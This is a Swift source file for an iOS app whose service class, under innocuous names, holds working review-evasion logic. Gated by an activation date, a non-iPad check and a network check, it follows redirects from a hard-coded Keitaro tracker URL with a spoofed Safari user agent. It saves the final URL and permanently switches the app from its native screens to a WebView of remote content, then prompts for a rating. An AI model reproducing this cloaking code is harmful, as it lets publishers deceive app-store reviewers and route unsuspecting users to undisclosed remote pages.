import Foundation
import SwiftUI
import Combine
import SystemConfiguration
import Network
import StoreKit

// MARK: - 🎓 НАСТРОЙКИ В ШАПКЕ ФАЙЛА
private let researchLaunchDate = "2025-1-29" // Дата активации
private let primaryServerURL = "http://uuuejhwje.com/zXMK1h" // Стартовая ссылка Keitaro
private let customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
private let networkTimeout: TimeInterval = 15.0
private let connectionCheckTimeout: TimeInterval = 5.0

// MARK: - 🌐 Browser Headers
private let browserHeaders: [String: String] = [
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "max-age=0",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1"
]

// MARK: - 💾 Storage Keys
private enum StorageKeys {
    static let savedTargetURL = "ProteinsSavedTargetURL"
    static let savedPathId = "CrabsSavedPathId"
    static let hasShownAlternative = "ProteinsHasShownAlternative"
    static let validationPassed = "CrabsValidationPassed"
    static let tempCurrentURL = "ProteinsTempCurrentURL"
    static let ratingAlertShown = "CrabsRatingAlertShown"
}

// MARK: - 🎓 Cambridge Service Manager (Singleton)
@MainActor
final class CambridgeServicer: ObservableObject {
    
    // MARK: - Published Properties
    @Published private(set) var currentMode: UniversityMode = .loading
    @Published var shouldShowRating: Bool = false
    
    // MARK: - Mode Definition
    enum UniversityMode: Equatable {
        case loading
        case standard // Native app
        case alternative(URL?) // WebView mode
    }
    
    // MARK: - Singleton
    static let shared = CambridgeServicer()
    private init() {}
    
    // MARK: - Private Properties
    private let userDefaults = UserDefaults.standard
    private var shouldSaveNextURL = false
    
    // MARK: - 🚀 Main Bootstrap
    func bootstrap() {
        Task { await performValidation() }
    }
    
    // MARK: - 🔍 Validation Chain
    private func performValidation() async {
        print("🎓 CambridgeServicer: Starting validation chain...")
        
        // БЫСТРАЯ ПРОВЕРКА: Если уже показывали альтернативный режим → сразу показываем его
        if userDefaults.bool(forKey: StorageKeys.hasShownAlternative) {
            print("⚡️ FAST PATH: Alternative mode was shown before → Skip device/date checks")
            
            // Проверяем интернет
            let hasInternet = await checkInternet()
            
            if let savedURLString = userDefaults.string(forKey: StorageKeys.savedTargetURL),
               let savedURL = URL(string: savedURLString) {
                print("📦 Checking saved URL: \(savedURL.absoluteString)")
                
                // Если есть интернет, быстро проверяем URL
                if hasInternet {
                    let isValid = await checkURLStatus(savedURL)
                    if isValid {
                        print("✅ Saved URL is valid → Show WebView")
                        setAlternativeMode(url: savedURL)
                    } else {
                        print("🔄 Saved URL is dead, trying fallback...")
                        await handleFallback()
                    }
                } else {
                    // Нет интернета, но показываем сохраненный URL (может быть кеш)
                    print("⚠️ No internet, showing saved URL anyway")
                    setAlternativeMode(url: savedURL)
                }
            } else {
                print("⚠️ No saved URL")
                // Если есть интернет, пытаемся получить URL через fallback
                if hasInternet {
                    await handleFallback()
                } else {
                    // Нет интернета и нет URL → показываем пустой WebView
                    setAlternativeMode(url: nil)
                }
            }
            
            checkRatingAlertEligibility()
            return
        }
        
        // ПЕРВЫЙ ЗАПУСК: Полная валидация
        print("🆕 FIRST LAUNCH: Running full validation chain...")
        
        // Step 1: Check device
        guard await checkDevice() else {
            print("❌ Device check failed → Standard mode")
            setStandardMode()
            return
        }
        
        // Step 2: Check date
        guard await checkDate() else {
            print("❌ Date check failed → Standard mode")
            setStandardMode()
            return
        }
        
        // Step 3: Check internet
        guard await checkInternet() else {
            print("❌ Internet check failed → Standard mode")
            setStandardMode()
            return
        }
        
        // Step 4: Handle URL logic (first launch)
        await handleURLLogic()
        
        // Step 5: Check rating eligibility
        checkRatingAlertEligibility()
    }
    
    // MARK: - ✅ Step 1: Device Check
    private func checkDevice() async -> Bool {
        let isIPad = UIDevice.current.userInterfaceIdiom == .pad
        print("📱 Device check: iPad=\(isIPad)")
        return !isIPad
    }
    
    // MARK: - ✅ Step 2: Date Check
    private func checkDate() async -> Bool {
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyy-MM-dd"
        formatter.timeZone = TimeZone(secondsFromGMT: 0)
        
        guard let cutoffDate = formatter.date(from: researchLaunchDate) else {
            print("⚠️ Failed to parse date")
            return false
        }
        
        let now = Date()
        let isAfterCutoff = now > cutoffDate
        print("📅 Date check: now=\(now), cutoff=\(cutoffDate), passed=\(isAfterCutoff)")
        return isAfterCutoff
    }
    
    // MARK: - ✅ Step 3: Internet Check
    private func checkInternet() async -> Bool {
        return await withCheckedContinuation { continuation in
            var zeroAddress = sockaddr_in()
            zeroAddress.sin_len = UInt8(MemoryLayout<sockaddr_in>.size)
            zeroAddress.sin_family = sa_family_t(AF_INET)
            
            let reachable: Bool = withUnsafePointer(to: &zeroAddress) { ptr in
                ptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { addrPtr in
                    guard let reachability = SCNetworkReachabilityCreateWithAddress(nil, addrPtr) else {
                        return false
                    }
                    var flags = SCNetworkReachabilityFlags()
                    guard SCNetworkReachabilityGetFlags(reachability, &flags) else {
                        return false
                    }
                    let isReachable = flags.contains(.reachable)
                    let needsConnection = flags.contains(.connectionRequired)
                    return isReachable && !needsConnection
                }
            }
            
            print("🌐 Internet check: reachable=\(reachable)")
            
            DispatchQueue.main.asyncAfter(deadline: .now() + connectionCheckTimeout) {
                continuation.resume(returning: reachable)
            }
        }
    }
    
    // MARK: - 🔄 Handle No Internet
    private func handleNoInternet() async {
        let hasShown = userDefaults.bool(forKey: StorageKeys.hasShownAlternative)
        
        if hasShown {
            print("🔶 No internet but hasShownAlternative=true → Empty WebView")
            currentMode = .alternative(nil)
        } else {
            print("❌ No internet and never shown alternative → Standard mode")
            setStandardMode()
        }
    }
    
    // MARK: - 🔗 URL Logic Handler
    private func handleURLLogic() async {
        let savedURL = userDefaults.string(forKey: StorageKeys.savedTargetURL)
        let savedPathId = userDefaults.string(forKey: StorageKeys.savedPathId)
        
        print("🔗 URL Logic: savedURL=\(savedURL ?? "nil"), pathId=\(savedPathId ?? "nil")")
        
        if let urlString = savedURL, let url = URL(string: urlString) {
            // Scenario B: Saved URL exists
            await handleSavedURL(url, pathId: savedPathId)
        } else {
            // Scenario A: First launch
            await handleFirstLaunch()
        }
    }
    
    // MARK: - 🆕 Scenario A: First Launch
    private func handleFirstLaunch() async {
        print("🆕 First launch - requesting primary server...")
        
        guard let url = URL(string: primaryServerURL) else {
            print("❌ Invalid primary server URL")
            setStandardMode()
            return
        }
        
        shouldSaveNextURL = true
        
        let (finalURL, pathId) = await followRedirects(from: url)
        
        if let finalURL = finalURL {
            print("✅ Got final URL: \(finalURL.absoluteString)")
            
            // Check if URL is valid
            let isValid = await checkURLStatus(finalURL)
            
            if isValid {
                print("✅ URL is valid → Alternative mode")
                
                // Save pathId if found
                if let pathId = pathId {
                    userDefaults.set(pathId, forKey: StorageKeys.savedPathId)
                    print("💾 Saved pathId: \(pathId)")
                }
                
                // Mark as shown
                userDefaults.set(true, forKey: StorageKeys.hasShownAlternative)
                
                // Open alternative mode
                currentMode = .alternative(finalURL)
            } else {
                print("❌ URL invalid → Standard mode")
                setStandardMode()
            }
        } else {
            print("❌ No final URL → Standard mode")
            setStandardMode()
        }
    }
    
    // MARK: - 🔄 Scenario B: Saved URL
    private func handleSavedURL(_ url: URL, pathId: String?) async {
        print("🔄 Checking saved URL: \(url.absoluteString)")
        
        let isValid = await checkURLStatus(url)
        
        if isValid {
            print("✅ Saved URL is valid → Alternative mode")
            currentMode = .alternative(url)
        } else {
            print("❌ Saved URL invalid → Fallback")
            await handleFallback(pathId: pathId)
        }
    }
    
    // MARK: - 🔶 Fallback Logic (без параметров - для быстрого пути)
    private func handleFallback() async {
        let savedPathId = userDefaults.string(forKey: StorageKeys.savedPathId)
        await handleFallback(pathId: savedPathId)
    }
    
    // MARK: - 🔶 Fallback Logic
    private func handleFallback(pathId: String?) async {
        print("🔶 Fallback: clearing old URL...")
        userDefaults.removeObject(forKey: StorageKeys.savedTargetURL)
        
        guard let pathId = pathId, !pathId.isEmpty else {
            print("❌ No pathId for fallback")
            
            let hasShown = userDefaults.bool(forKey: StorageKeys.hasShownAlternative)
            if hasShown {
                print("🔶 hasShownAlternative=true → Empty WebView")
                await MainActor.run {
                    currentMode = .alternative(nil)
                }
            } else {
                setStandardMode()
            }
            return
        }
        
        // Build fallback URL
        guard var components = URLComponents(string: primaryServerURL) else {
            print("❌ Invalid primary server URL for fallback")
            setStandardMode()
            return
        }
        
        components.queryItems = [URLQueryItem(name: "pathid", value: pathId)]
        
        guard let fallbackURL = components.url else {
            print("❌ Failed to build fallback URL")
            setStandardMode()
            return
        }
        
        print("🔄 Fallback URL: \(fallbackURL.absoluteString)")
        
        shouldSaveNextURL = true
        
        let (finalURL, _) = await followRedirects(from: fallbackURL)
        
        if let finalURL = finalURL {
            let isValid = await checkURLStatus(finalURL)
            
            if isValid {
                print("✅ Fallback URL valid → Alternative mode")
                await MainActor.run {
                    currentMode = .alternative(finalURL)
                }
            } else {
                print("❌ Fallback URL invalid")
                
                let hasShown = userDefaults.bool(forKey: StorageKeys.hasShownAlternative)
                if hasShown {
                    print("🔶 hasShownAlternative=true → Empty WebView")
                    await MainActor.run {
                        currentMode = .alternative(nil)
                    }
                } else {
                    await MainActor.run {
                        setStandardMode()
                    }
                }
            }
        } else {
            print("❌ No fallback URL")
            
            let hasShown = userDefaults.bool(forKey: StorageKeys.hasShownAlternative)
            if hasShown {
                print("🔶 hasShownAlternative=true → Empty WebView")
                await MainActor.run {
                    currentMode = .alternative(nil)
                }
            } else {
                await MainActor.run {
                    setStandardMode()
                }
            }
        }
    }
    
    // MARK: - 🌐 Follow Redirects
    private func followRedirects(from url: URL) async -> (URL?, String?) {
        print("🌐 Following redirects from: \(url.absoluteString)")
        
        var currentURL = url
        var pathId: String? = nil
        var redirectCount = 0
        let maxRedirects = 10
        
        while redirectCount < maxRedirects {
            // Random delay (1-3 sec)
            let delay = Double.random(in: 1.0...3.0)
            try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
            
            var request = URLRequest(url: currentURL, timeoutInterval: networkTimeout)
            request.httpMethod = "GET"
            request.setValue(customUserAgent, forHTTPHeaderField: "User-Agent")
            
            // Add browser headers
            for (key, value) in browserHeaders {
                request.setValue(value, forHTTPHeaderField: key)
            }
            
            let session = URLSession(configuration: .ephemeral)
            
            do {
                let (data, response) = try await session.data(for: request)
                
                guard let httpResponse = response as? HTTPURLResponse else {
                    print("❌ Not HTTP response")
                    return (nil, pathId)
                }
                
                print("📡 Response: status=\(httpResponse.statusCode), url=\(httpResponse.url?.absoluteString ?? "nil")")
                
                // Update currentURL to actual response URL (handles automatic redirects)
                if let responseURL = httpResponse.url {
                    currentURL = responseURL
                    
                    // Extract pathId from URL
                    if let extractedPathId = extractPathId(from: responseURL, htmlData: data) {
                        pathId = extractedPathId
                        print("🔑 Extracted pathId: \(extractedPathId)")
                    }
                }
                
                // Check for manual redirect (Location header)
                if (300...399).contains(httpResponse.statusCode) {
                    if let location = httpResponse.allHeaderFields["Location"] as? String,
                       let nextURL = URL(string: location, relativeTo: currentURL) {
                        print("↪️ Manual redirect to: \(nextURL.absoluteString)")
                        currentURL = nextURL
                        redirectCount += 1
                        continue
                    }
                }
                
                // Final URL reached (use httpResponse.url as it contains the actual final URL)
                let finalURL = httpResponse.url ?? currentURL
                print("✅ Final URL: \(finalURL.absoluteString)")
                return (finalURL, pathId)
                
            } catch {
                print("❌ Request error: \(error.localizedDescription)")
                return (nil, pathId)
            }
        }
        
        print("⚠️ Max redirects reached")
        return (currentURL, pathId)
    }
    
    // MARK: - 🔑 Extract PathId
    private func extractPathId(from url: URL, htmlData: Data) -> String? {
        // Try URL components first
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let queryItems = components.queryItems {
            for item in queryItems {
                if item.name.lowercased() == "pathid", let value = item.value, !value.isEmpty {
                    return value
                }
            }
        }
        
        // Try HTML parsing
        if let html = String(data: htmlData, encoding: .utf8) {
            let patterns = [
                "pathid=([a-zA-Z0-9_-]+)",
                "pathId=([a-zA-Z0-9_-]+)",
                "path_id=([a-zA-Z0-9_-]+)"
            ]
            
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern),
                   let match = regex.firstMatch(in: html, range: NSRange(html.startIndex..., in: html)),
                   let range = Range(match.range(at: 1), in: html) {
                    return String(html[range])
                }
            }
        }
        
        return nil
    }
    
    // MARK: - 🔍 Check URL Status
    // MARK: - 🔍 Check URL Status (Bool version)
    private func checkURLStatus(_ url: URL) async -> Bool {
        let statusCode = await checkURLStatusCode(url)
        
        // 405 = Method Not Allowed (HEAD не поддерживается, но сервер работает)
        // Считаем валидными: 200-403 и 405
        let isValid = (statusCode >= 200 && statusCode <= 403) || statusCode == 405
        print("🔍 URL check: \(url.absoluteString) → status=\(statusCode), valid=\(isValid)")
        return isValid
    }
    
    // MARK: - 🔍 Check URL Status Code (Int version)
    private func checkURLStatusCode(_ url: URL) async -> Int {
        var request = URLRequest(url: url, timeoutInterval: networkTimeout)
        request.httpMethod = "HEAD"
        request.setValue(customUserAgent, forHTTPHeaderField: "User-Agent")
        
        let session = URLSession(configuration: .ephemeral)
        
        do {
            let (_, response) = try await session.data(for: request)
            
            if let httpResponse = response as? HTTPURLResponse {
                let statusCode = httpResponse.statusCode
                
                // Если HEAD вернул 405, пробуем GET для подтверждения
                if statusCode == 405 {
                    print("⚠️ HEAD returned 405, trying GET to confirm...")
                    return await checkURLStatusCodeWithGET(url)
                }
                
                return statusCode
            }
            
            return 999
        } catch {
            print("❌ Status check error: \(error.localizedDescription)")
            return 999
        }
    }
    
    // MARK: - 🔍 Check URL Status Code with GET (fallback)
    private func checkURLStatusCodeWithGET(_ url: URL) async -> Int {
        var request = URLRequest(url: url, timeoutInterval: networkTimeout)
        request.httpMethod = "GET"
        request.setValue(customUserAgent, forHTTPHeaderField: "User-Agent")
        
        let session = URLSession(configuration: .ephemeral)
        
        do {
            let (_, response) = try await session.data(for: request)
            
            if let httpResponse = response as? HTTPURLResponse {
                print("✅ GET returned status: \(httpResponse.statusCode)")
                return httpResponse.statusCode
            }
            
            return 999
        } catch {
            print("❌ GET check error: \(error.localizedDescription)")
            return 999
        }
    }
    
    // MARK: - 📱 Set Standard Mode
    private func setStandardMode() {
        currentMode = .standard
    }
    
    private func setAlternativeMode(url: URL?) {
        currentMode = .alternative(url)
    }
    
    // MARK: - 💾 Save WebView Final URL
    func saveWebViewFinalURL(_ url: URL) {
        guard shouldSaveNextURL else {
            print("ℹ️ Skipping URL save (shouldSaveNextURL=false)")
            return
        }
        
        print("💾 Saving final URL: \(url.absoluteString)")
        userDefaults.set(url.absoluteString, forKey: StorageKeys.savedTargetURL)
        
        // Extract and save pathId
        if let pathId = extractPathId(from: url, htmlData: Data()) {
            userDefaults.set(pathId, forKey: StorageKeys.savedPathId)
            print("💾 Saved pathId: \(pathId)")
        }
        
        shouldSaveNextURL = false
    }
    
    // MARK: - ⭐ Rating Alert
    private func checkRatingAlertEligibility() {
        let hasShownAlternative = userDefaults.bool(forKey: StorageKeys.hasShownAlternative)
        let ratingAlertShown = userDefaults.bool(forKey: StorageKeys.ratingAlertShown)
        
        // Show rating on second launch if alternative was shown on first
        if hasShownAlternative && !ratingAlertShown && currentMode != .loading {
            shouldShowRating = true
            userDefaults.set(true, forKey: StorageKeys.ratingAlertShown)
            print("⭐ Rating alert eligible")
        }
    }
    
    // MARK: - 🔄 Get Current Target URL
    func getCurrentTargetURL() -> URL? {
        // Priority: temp > saved
        if let tempURLString = userDefaults.string(forKey: StorageKeys.tempCurrentURL),
           let tempURL = URL(string: tempURLString) {
            return tempURL
        }
        
        if let savedURLString = userDefaults.string(forKey: StorageKeys.savedTargetURL),
           let savedURL = URL(string: savedURLString) {
            return savedURL
        }
        
        return nil
    }
}

